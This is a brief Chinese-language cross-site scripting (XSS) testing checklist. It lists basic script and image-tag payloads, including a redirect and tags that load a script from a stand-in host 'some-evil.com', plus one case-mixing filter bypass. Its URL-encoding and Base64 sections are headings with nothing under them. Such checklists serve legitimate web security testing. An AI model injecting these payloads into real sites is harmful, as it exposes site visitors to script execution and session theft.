# XSS 测试 Checklist

## 基本

`<script>alert("请移步");location.href="http://somehost.com"</script>`


`<script src="http://some-evil.com/xss.js"></script>`


`<img src="#" onerror=alert("xss")>`

`<img src="http://some-evil.com/xss.js" >`

`<img src="javascript:alert("xss")">`


## 绕过

### 使用大小写混淆

`<scrIPt>alert("xss")</scRIPt>`

### 采用 URL编码


### 采用 BASE64编码



